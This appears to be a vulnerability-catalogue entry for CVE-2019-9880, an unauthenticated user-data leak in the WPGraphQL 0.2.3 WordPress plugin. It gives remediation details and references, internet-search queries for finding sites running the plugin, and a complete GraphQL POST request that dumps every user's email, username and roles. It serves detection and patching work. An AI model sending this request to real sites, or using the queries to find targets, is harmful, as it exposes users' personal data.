---
layout: post
cve_id: CVE-2019-9880
title: WPEngine WPGraphQL 0.2.3 - Unauthenticated User Information Disclosure
pcap: true
pcap_path: /pcaps/2019/CVE-2019-9880.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-9880.yaml
snort2_rule: N/A
snort3_rule: N/A
author: intelligent-ears
severity: critical
impact: 'An attacker can exploit this vulnerability to enumerate all WordPress users
  and extract sensitive information including email addresses, usernames, and user
  roles without authentication.

  '
remediation: 'Update WPGraphQL to version 0.3.0 or later to fix this vulnerability.

  '
reference:
- http://packetstormsecurity.com/files/153025/WordPress-WPGraphQL-0.2.3-Authentication-Bypass-Information-Disclosure.html
- https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py
- https://github.com/wp-graphql/wp-graphql/releases/tag/v0.3.0
- https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cve-id: CVE-2019-9880
  cwe-id: CWE-306
  epss-score: 0.6462
  epss-percentile: 0.98389
  cpe: cpe:2.3:a:wpengine:wpgraphql:0.2.3:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 1
  vendor: wpengine
  product: wpgraphql
  framework: wordpress
  fofa-query: body="/wp-content/plugins/wp-graphql/"
  publicwww-query: /wp-content/plugins/wp-graphql/
tags:
- cve
- cve2019
- wp
- wp-plugin
- wordpress
- wp-graphql
- wpengine
- unauth
- info-leak
- vkev
- vuln
---

## üîç Vulnerability Description
An issue was discovered in the WPGraphQL 0.2.3 plugin for WordPress. By querying the 'users' RootQuery, it is possible, for an unauthenticated attacker, to retrieve all WordPress users details such as email address, role, and username.


## üåê HTTP Request
```nohighlight
POST /graphql HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Content-Length: 71
Content-Type: application/json
Accept-Encoding: gzip

{"query": "query { users { nodes { id name email username roles } } }"}
```

